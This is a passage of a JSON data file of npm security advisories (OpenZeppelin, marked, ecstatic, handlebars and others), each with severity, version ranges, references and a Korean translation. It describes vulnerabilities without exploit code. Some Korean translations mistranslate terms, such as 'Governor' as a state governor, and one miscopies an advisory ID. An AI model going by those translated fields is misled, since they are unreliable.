    "description": "### Impact\n\nThis issue concerns instances of Governor that use the module `GovernorVotesQuorumFraction`, a mechanism that determines quorum requirements as a percentage of the voting token's total supply. In affected instances, when a proposal is passed to lower the quorum requirement, past proposals may become executable if they had been defeated only due to lack of quorum, and the number of votes it received meets the new quorum requirement.\n\nAnalysis of instances on chain found only one proposal that met this condition, and we are actively monitoring for new occurrences of this particular issue.\n\n### Patches\n\nThis issue has been patched in v4.7.2.\n\n### Workarounds\n\nAvoid lowering quorum requirements if a past proposal was defeated for lack of quorum.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3561\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying the fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",
    "identifiers": "GHSA : GHSA-xrc4-737v-9q75\nCVE : CVE-2022-31198",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:06:59Z",
    "publishedAt": "2022-08-18T18:48:41Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-xrc4-737v-9q75\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31198\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3561\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.2\nhttps://github.com/advisories/GHSA-xrc4-737v-9q75",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.3.0, < 4.7.2",
    "identifier": "4.7.2",
    "descriptionKR": "### 영향\n\n이 문제는 투표 토큰의 총 공급량의 백분율로 쿼럼 요구 사항을 결정하는 메커니즘인 'GovernorVotesQuorumFraction' 모듈을 사용하는 주지사의 인스턴스와 관련이 있습니다. 영향을 받는 경우, 정족수 요구 사항을 낮추기 위해 제안이 통과되면 과거 제안이 정족수 부족으로 인해 패배하고 받은 투표 수가 새로운 정족수 요구 사항을 충족하는 경우에만 실행 가능해질 수 있습니다.\n\n체인의 인스턴스를 분석한 결과 이 ​​조건을 충족하는 제안이 하나만 발견되었으며, 이 특정 문제가 새로 발생하는지 적극적으로 모니터링하고 있습니다.\n\n### 패치\n\n이 문제는 v4.7.2에서 패치되었습니다.\n\n### 해결 방법\n\n정족수 부족으로 과거 제안이 거부된 경우 정족수 요구 사항을 낮추지 마십시오.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3561\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\nContracts using the cross chain utilies for Arbitrum L2, `CrossChainEnabledArbitrumL2` or `LibArbitrumL2`, will classify direct interactions of externally owned accounts (EOAs) as cross chain calls, even though they are not started on L1. This is assessed as low severity because any action taken by an EOA on the contract could also be taken by the EOA through the bridge if the issue was not present.\n\n### Patches\n\nThis issue has been patched in v4.7.2.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3578\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying a fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",
    "identifiers": "GHSA : GHSA-9j3m-g383-29qr\nCVE : CVE-2022-35916",
    "severity": "MODERATE",
    "updatedAt": "2023-02-02T05:02:54Z",
    "publishedAt": "2022-08-14T00:25:11Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-9j3m-g383-29qr\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35916\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3578\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.2\nhttps://github.com/advisories/GHSA-9j3m-g383-29qr",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.6.0, < 4.7.2",
    "identifier": "4.7.2",
    "descriptionKR": "### 영향\n\nArbitrum L2, 'CrossChainEnabledArbitrumL2' 또는 'LibArbitrumL2'에 대한 크로스 체인 유틸리티를 사용하는 계약은 외부 소유 계정(EOA)의 직접적인 상호 작용을 L1에서 시작되지 않더라도 크로스 체인 호출로 분류합니다. 계약에 대해 EOA가 취한 조치는 문제가 없는 경우 브릿지를 통해 EOA가 취할 수 있기 때문에 심각도가 낮은 것으로 평가됩니다.\n\n### 패치\n\n이 문제는 v4.7.2에서 패치되었습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3578\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\nContracts using the cross chain utilies for Arbitrum L2, `CrossChainEnabledArbitrumL2` or `LibArbitrumL2`, will classify direct interactions of externally owned accounts (EOAs) as cross chain calls, even though they are not started on L1. This is assessed as low severity because any action taken by an EOA on the contract could also be taken by the EOA through the bridge if the issue was not present.\n\n### Patches\n\nThis issue has been patched in v4.7.2.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3578\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying a fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",
    "identifiers": "GHSA : GHSA-9j3m-g383-29qr\nCVE : CVE-2022-35916",
    "severity": "MODERATE",
    "updatedAt": "2023-02-02T05:02:54Z",
    "publishedAt": "2022-08-14T00:25:11Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-9j3m-g383-29qr\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35916\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3578\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.2\nhttps://github.com/advisories/GHSA-9j3m-g383-29qr",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.6.0, < 4.7.2",
    "identifier": "4.7.2",
    "descriptionKR": "### 영향\n\nArbitrum L2, 'CrossChainEnabledArbitrumL2' 또는 'LibArbitrumL2'에 대한 크로스 체인 유틸리티를 사용하는 계약은 외부 소유 계정(EOA)의 직접적인 상호 작용을 L1에서 시작되지 않더라도 크로스 체인 호출로 분류합니다. 계약에 대해 EOA가 취한 조치는 문제가 없는 경우 브릿지를 통해 EOA가 취할 수 있기 때문에 심각도가 낮은 것으로 평가됩니다.\n\n### 패치\n\n이 문제는 v4.7.2에서 패치되었습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3578\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "A command injection vulnerability affects all versions of package monorepo-build.",
    "identifiers": "GHSA : GHSA-5vrc-7jfr-4642\nCVE : CVE-2020-28423",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-02T05:02:42Z",
    "publishedAt": "2022-08-03T00:00:56Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28423\nhttps://security.snyk.io/vuln/SNYK-JS-MONOREPOBUILD-1050392\nhttps://github.com/advisories/GHSA-5vrc-7jfr-4642",
    "name": "monorepo-build",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.1.9",
    "descriptionKR": "명령 주입 취약점은 패키지 monorepo-build의 모든 버전에 영향을 미칩니다."
  },
  {
    "description": "### Impact\n\nThe target contract of an EIP-165 `supportsInterface` query can cause unbounded gas consumption by returning a lot of data, while it is generally assumed that this operation has a bounded cost.\n\n### Patches\n\nThe issue has been fixed in v4.7.2.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying a fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",
    "identifiers": "GHSA : GHSA-7grf-83vw-6f5x\nCVE : CVE-2022-35915",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:32:44Z",
    "publishedAt": "2022-08-14T00:23:34Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-7grf-83vw-6f5x\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35915\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.2\nhttps://github.com/advisories/GHSA-7grf-83vw-6f5x",
    "name": "openzeppelin-eth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, <= 2.2.0",
    "descriptionKR": "### 영향\n\nEIP-165 'supportsInterface' 쿼리의 대상 계약은 많은 데이터를 반환하여 무한한 가스 소비를 유발할 수 있지만 일반적으로 이 작업에는 제한된 비용이 있다고 가정합니다.\n\n### 패치\n\n이 문제는 v4.7.2에서 수정되었습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\nThe target contract of an EIP-165 `supportsInterface` query can cause unbounded gas consumption by returning a lot of data, while it is generally assumed that this operation has a bounded cost.\n\n### Patches\n\nThe issue has been fixed in v4.7.2.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying a fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",
    "identifiers": "GHSA : GHSA-7grf-83vw-6f5x\nCVE : CVE-2022-35915",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:32:44Z",
    "publishedAt": "2022-08-14T00:23:34Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-7grf-83vw-6f5x\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35915\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.2\nhttps://github.com/advisories/GHSA-7grf-83vw-6f5x",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.2.0, < 4.7.2",
    "identifier": "4.7.2",
    "descriptionKR": "### 영향\n\nEIP-165 'supportsInterface' 쿼리의 대상 계약은 많은 데이터를 반환하여 무한한 가스 소비를 유발할 수 있지만 일반적으로 이 작업에는 제한된 비용이 있다고 가정합니다.\n\n### 패치\n\n이 문제는 v4.7.2에서 수정되었습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\nThe target contract of an EIP-165 `supportsInterface` query can cause unbounded gas consumption by returning a lot of data, while it is generally assumed that this operation has a bounded cost.\n\n### Patches\n\nThe issue has been fixed in v4.7.2.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying a fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",
    "identifiers": "GHSA : GHSA-7grf-83vw-6f5x\nCVE : CVE-2022-35915",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:32:44Z",
    "publishedAt": "2022-08-14T00:23:34Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-7grf-83vw-6f5x\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35915\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.2\nhttps://github.com/advisories/GHSA-7grf-83vw-6f5x",
    "name": "openzeppelin-solidity",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, <= 4.6.0",
    "descriptionKR": "### 영향\n\nEIP-165 'supportsInterface' 쿼리의 대상 계약은 많은 데이터를 반환하여 무한한 가스 소비를 유발할 수 있지만 일반적으로 이 작업에는 제한된 비용이 있다고 가정합니다.\n\n### 패치\n\n이 문제는 v4.7.2에서 수정되었습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\nThe target contract of an EIP-165 `supportsInterface` query can cause unbounded gas consumption by returning a lot of data, while it is generally assumed that this operation has a bounded cost.\n\n### Patches\n\nThe issue has been fixed in v4.7.2.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying a fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",
    "identifiers": "GHSA : GHSA-7grf-83vw-6f5x\nCVE : CVE-2022-35915",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:32:44Z",
    "publishedAt": "2022-08-14T00:23:34Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-7grf-83vw-6f5x\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35915\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.2\nhttps://github.com/advisories/GHSA-7grf-83vw-6f5x",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 4.7.2",
    "identifier": "4.7.2",
    "descriptionKR": "### 영향\n\nEIP-165 'supportsInterface' 쿼리의 대상 계약은 많은 데이터를 반환하여 무한한 가스 소비를 유발할 수 있지만 일반적으로 이 작업에는 제한된 비용이 있다고 가정합니다.\n\n### 패치\n\n이 문제는 v4.7.2에서 수정되었습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "constantinople before 3.1.1 affected by a sandbox bypass.",
    "identifiers": "GHSA : GHSA-hg7c-66ff-9q8g",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:02:14Z",
    "publishedAt": "2020-07-31T16:18:53Z",
    "withdrawnAt": "2020-07-31T16:18:53Z",
    "references": "https://github.com/pugjs/constantinople/commit/01d409c0d081dfd65223e6b7767c244156d35f7f\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1577703\nhttps://github.com/advisories/GHSA-hg7c-66ff-9q8g\nhttps://www.npmjs.com/advisories/568",
    "name": "constantinople",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.1.1",
    "identifier": "3.1.1",
    "descriptionKR": "샌드박스 바이패스의 영향을 받는 3.1.1 이전의 콘스탄티노플."
  },
  {
    "description": "A vulnerability was descovered in eslint before 4.18.2. One of the regexes in eslint is vulnerable to catastrophic backtracking.",
    "identifiers": "GHSA : GHSA-jcgq-xh2f-2hfm",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:37Z",
    "publishedAt": "2021-02-25T01:20:42Z",
    "withdrawnAt": "2021-02-25T01:20:42Z",
    "references": "https://github.com/eslint/eslint/issues/10002\nhttps://github.com/eslint/eslint/commit/f6901d0bcf6c918ac4e5c6c7c4bddeb2cb715c09\nhttps://github.com/advisories/GHSA-jcgq-xh2f-2hfm",
    "name": "eslint",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.18.2",
    "identifier": "4.18.2",
    "descriptionKR": "4.18.2 이전의 eslint에서 취약점이 발견되었습니다. eslint의 정규식 중 하나는 심각한 역추적에 취약합니다."
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-9q64-mpxx-87fg",
    "identifiers": "GHSA : GHSA-x4rf-4mqf-cm8w",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:42Z",
    "publishedAt": "2020-08-19T22:44:22Z",
    "withdrawnAt": "2020-08-19T22:44:22Z",
    "references": "https://github.com/jfhbrook/node-ecstatic/issues/259\nhttps://github.com/jfhbrook/node-ecstatic/commit/be6fc25a826f190b67f4d16158f9d67899e38ee4\nhttps://www.npmjs.com/advisories/830/versions\nhttps://github.com/advisories/GHSA-x4rf-4mqf-cm8w",
    "name": "ecstatic",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.1.2",
    "identifier": "4.1.2",
    "descriptionKR": "철회: GHSA-9q64-mxxx-87fg의 복제본"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-9q64-mpxx-87fg",
    "identifiers": "GHSA : GHSA-x4rf-4mqf-cm8w",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:42Z",
    "publishedAt": "2020-08-19T22:44:22Z",
    "withdrawnAt": "2020-08-19T22:44:22Z",
    "references": "https://github.com/jfhbrook/node-ecstatic/issues/259\nhttps://github.com/jfhbrook/node-ecstatic/commit/be6fc25a826f190b67f4d16158f9d67899e38ee4\nhttps://www.npmjs.com/advisories/830/versions\nhttps://github.com/advisories/GHSA-x4rf-4mqf-cm8w",
    "name": "ecstatic",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.3.2",
    "identifier": "3.3.2",
    "descriptionKR": "철회: GHSA-9q64-mxxx-87fg의 복제본"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-9q64-mpxx-87fg",
    "identifiers": "GHSA : GHSA-x4rf-4mqf-cm8w",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:42Z",
    "publishedAt": "2020-08-19T22:44:22Z",
    "withdrawnAt": "2020-08-19T22:44:22Z",
    "references": "https://github.com/jfhbrook/node-ecstatic/issues/259\nhttps://github.com/jfhbrook/node-ecstatic/commit/be6fc25a826f190b67f4d16158f9d67899e38ee4\nhttps://www.npmjs.com/advisories/830/versions\nhttps://github.com/advisories/GHSA-x4rf-4mqf-cm8w",
    "name": "ecstatic",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.2.2",
    "identifier": "2.2.2",
    "descriptionKR": "철회: GHSA-9q64-mxxx-87fg의 복제본"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-pp57-mqmh-44h7",
    "identifiers": "GHSA : GHSA-q9r2-f3vc-rjg8",
    "severity": "HIGH",
    "updatedAt": "2023-01-09T05:01:36Z",
    "publishedAt": "2020-08-19T22:28:51Z",
    "withdrawnAt": "2020-08-19T22:28:51Z",
    "references": "https://hackerone.com/reports/319467\nhttps://github.com/advisories/GHSA-q9r2-f3vc-rjg8",
    "name": "macaddress",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.2.9",
    "identifier": "0.2.9",
    "descriptionKR": "철회: GHSA-pp57-mqmh-44h7의 복제본"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-37q6-576q-vgr7",
    "identifiers": "GHSA : GHSA-5j4m-89xf-mf5p",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:35Z",
    "publishedAt": "2020-08-27T22:58:46Z",
    "withdrawnAt": "2020-08-27T22:58:46Z",
    "references": "https://github.com/parcel-bundler/parcel/issues/1783\nhttps://github.com/parcel-bundler/parcel/pull/1794\nhttps://github.com/parcel-bundler/parcel/commit/066e0bf6bd26b15c78bd47df023452e4b20073e4\nhttps://www.npmjs.com/advisories/721\nhttps://github.com/advisories/GHSA-5j4m-89xf-mf5p",
    "name": "parcel-bundler",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.10.0",
    "identifier": "1.10.0",
    "descriptionKR": "철회: GHSA-37q6-576q-vgr7 복제본"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-vgrx-w6rg-8fqf",
    "identifiers": "GHSA : GHSA-chgg-rrmv-5q7x",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:21Z",
    "publishedAt": "2020-08-03T18:05:48Z",
    "withdrawnAt": "2020-08-03T18:05:48Z",
    "references": "https://github.com/hokaccha/node-jwt-simple/pull/16\nhttps://github.com/hokaccha/node-jwt-simple/commit/957957cfa44474049b4603b293569588ee9ffd97\nhttps://github.com/advisories/GHSA-chgg-rrmv-5q7x",
    "name": "jwt-simple",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.3.1",
    "identifier": "0.3.1",
    "descriptionKR": "철회: GHSA-vgrx-w6rg-8fqf 중복"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-cgpp-wm2h-6hqx",
    "identifiers": "GHSA : GHSA-mpcx-8qqw-rmcq",
    "severity": "HIGH",
    "updatedAt": "2023-01-09T05:01:18Z",
    "publishedAt": "2020-08-19T21:51:20Z",
    "withdrawnAt": "2020-08-19T21:51:20Z",
    "references": "https://github.com/balderdashy/waterline/issues/1219#issuecomment-157294530\nhttps://github.com/advisories/GHSA-cgpp-wm2h-6hqx\nhttps://github.com/advisories/GHSA-mpcx-8qqw-rmcq",
    "name": "waterline-sequel",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.5.1",
    "identifier": "0.5.1",
    "descriptionKR": "철회: GHSA-cgpp-wm2h-6hqx의 복제본"
  },
  {
    "description": "Handlebars.js before 4.1.0 has Remote Code Execution (RCE)",
    "identifiers": "GHSA : GHSA-6r5x-hmgg-7h53",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:37Z",
    "publishedAt": "2019-07-15T19:46:01Z",
    "withdrawnAt": "2019-07-15T19:46:01Z",
    "references": "https://github.com/wycats/handlebars.js/issues/1267#issue-187151586\nhttps://github.com/wycats/handlebars.js/commit/edc6220d51139b32c28e51641fadad59a543ae57\nhttps://github.com/advisories/GHSA-6r5x-hmgg-7h53",
    "name": "handlebars",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.1.0",
    "identifier": "4.1.0",
    "descriptionKR": "4.1.0 이전의 Handlebars.js에는 원격 코드 실행(RCE)이 있습니다."
  },
  {
    "description": "\n**Withdrawn:** Duplicate of GHSA-j95h-wmx9-4279.\n\nAffected versions of the package are vulnerable to a Denial of Service attack sending an OPTIONS request for an undefined route.",
    "identifiers": "GHSA : GHSA-j95h-wmx9-4279",
    "severity": "HIGH",
    "updatedAt": "2023-01-09T05:01:44Z",
    "publishedAt": "2021-02-25T17:15:39Z",
    "withdrawnAt": "2021-02-25T17:15:39Z",
    "references": "https://github.com/balderdashy/sails/commit/252b7b8c68d393acdde597c8b187945c629e4f6a\nhttps://github.com/advisories/GHSA-j95h-wmx9-4279",
    "name": "sails",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.12.0",
    "identifier": "0.12.0",
    "descriptionKR": "**철회:** GHSA-j95h-wmx9-4279 사본.\n\n패키지의 영향을 받는 버전은 정의되지 않은 경로에 대한 OPTIONS 요청을 보내는 서비스 거부 공격에 취약합니다."
  },
  {
    "description": "Withdrawn: duplicate of GHSA-wjr4-2jgw-hmv8",
    "identifiers": "GHSA : GHSA-p56r-jr4p-4wgh",
    "severity": "HIGH",
    "updatedAt": "2023-01-09T05:01:36Z",
    "publishedAt": "2020-08-03T18:16:37Z",
    "withdrawnAt": "2020-08-03T18:16:37Z",
    "references": "https://github.com/vvo/node-whereis/commit/0f64e3780235004fb6e43bfd153ea3e0e210ee2b\nhttps://github.com/advisories/GHSA-p56r-jr4p-4wgh",
    "name": "whereis",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.4.1",
    "identifier": "0.4.1",
    "descriptionKR": "철회: GHSA-wjr4-2jgw-hmv8 복제본"
  },
  {
    "description": "Versions 0.3.7 and earlier of marked When mangling is disabled via option mangle don't escape target href. This allow attacker to inject arbitrary html-event into resulting a tag.",
    "identifiers": "GHSA : GHSA-wjmf-58vc-xqjr",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:42Z",
    "publishedAt": "2021-02-25T02:01:56Z",
    "withdrawnAt": "2021-02-25T02:01:56Z",
    "references": "https://github.com/markedjs/marked/issues/926\nhttps://github.com/markedjs/marked/commit/cb72584c5d9d32ebfdbb99e35fb9b81af2b79686\nhttps://github.com/advisories/GHSA-wjmf-58vc-xqjr",
    "name": "marked",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.3.9",
    "identifier": "0.3.9",
    "descriptionKR": "버전 0.3.7 및 이전 버전은 mangle 옵션을 통해 mangling이 비활성화된 경우 target href를 이스케이프하지 않습니다. 이를 통해 공격자는 결과 태그에 임의의 html 이벤트를 주입할 수 있습니다."
  },
  {
    "description": "A flaw was found in nodejs-marked versions from 0.5.0 to before 0.6.1. Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). Input to the host variable is vulnerable when input contains parenthesis in link URIs, coupled with a high number of link tokens in a single line.",
    "identifiers": "GHSA : GHSA-7m7q-q53v-j47v",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:35Z",
    "publishedAt": "2021-02-25T02:01:47Z",
    "withdrawnAt": "2021-02-25T02:01:47Z",
    "references": "https://github.com/Feder1co5oave/marktex/commit/cc8a45288b59ca10a8fedaed9028072021be9999\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1679550\nhttps://github.com/advisories/GHSA-7m7q-q53v-j47v",
    "name": "marked",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.5.0, < 0.6.1",
    "identifier": "0.6.1",
    "descriptionKR": "0.5.0에서 0.6.1 이전까지 nodejs로 표시된 버전에서 결함이 발견되었습니다. 이 패키지의 영향을 받는 버전은 정규식 서비스 거부(ReDoS)에 취약합니다. 호스트 변수에 대한 입력은 입력에 링크 URI에 괄호가 포함되어 있고 한 줄에 많은 수의 링크 토큰이 있는 경우 취약합니다."
  },
  {
    "description": "Versions 0.3.7 and earlier of marked unescape only lowercase while owsers support both lowercase and uppercase x in hexadecimal form of HTML character entity",
    "identifiers": "GHSA : GHSA-8wp3-cp9v-44fm",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:41Z",
    "publishedAt": "2021-02-25T02:01:15Z",
    "withdrawnAt": "2021-02-25T02:01:15Z",
    "references": "https://github.com/markedjs/marked/issues/925\nhttps://github.com/markedjs/marked/commit/6d1901ff71abb83aa32ca9a5ce47471382ea42a9\nhttps://github.com/advisories/GHSA-8wp3-cp9v-44fm",
    "name": "marked",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.3.9",
    "identifier": "0.3.9",
    "descriptionKR": "버전 0.3.7 및 이전 버전은 unescape로 표시된 소문자만 소문자이며 소유자는 HTML 문자 엔티티의 16진수 형식에서 소문자와 대문자 x를 모두 지원합니다."
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-762f-c2wg-m8c8",
    "identifiers": "GHSA : GHSA-4gpv-cvmq-6526",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:38Z",
    "publishedAt": "2020-08-19T22:23:09Z",
    "withdrawnAt": "2020-08-19T22:23:09Z",
    "references": "https://hackerone.com/reports/319576\nhttps://github.com/dcodeIO/protobuf.js/blob/6.8.5/src/parse.js#L27\nhttps://www.npmjs.com/advisories/605\nhttps://github.com/advisories/GHSA-4gpv-cvmq-6526",
    "name": "protobufjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.0.3",
    "identifier": "5.0.3",
    "descriptionKR": "철회: GHSA-762f-c2wg-m8c8 복제본"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-762f-c2wg-m8c8",
    "identifiers": "GHSA : GHSA-4gpv-cvmq-6526",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:38Z",
    "publishedAt": "2020-08-19T22:23:09Z",
    "withdrawnAt": "2020-08-19T22:23:09Z",
    "references": "https://hackerone.com/reports/319576\nhttps://github.com/dcodeIO/protobuf.js/blob/6.8.5/src/parse.js#L27\nhttps://www.npmjs.com/advisories/605\nhttps://github.com/advisories/GHSA-4gpv-cvmq-6526",
    "name": "protobufjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.8.6",
    "identifier": "6.8.6",
    "descriptionKR": "철회: GHSA-762f-c2wg-m8c8 복제본"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-8g7p-74h8-hg48",
    "identifiers": "GHSA : GHSA-qrg3-f6h6-vq8q",
    "severity": "HIGH",
    "updatedAt": "2023-01-09T05:01:41Z",
    "publishedAt": "2020-08-19T22:15:57Z",
    "withdrawnAt": "2020-08-19T22:15:57Z",
    "references": "https://hackerone.com/reports/319532\nhttps://github.com/advisories/GHSA-qrg3-f6h6-vq8q",
    "name": "https-proxy-agent",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.2.0",
    "identifier": "2.2.0",
    "descriptionKR": "철회: GHSA-8g7p-74h8-hg48의 복제본"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-7qcx-jmrc-h2rr",
    "identifiers": "GHSA : GHSA-h29r-4vqp-8jxf",
    "severity": "MODERATE",
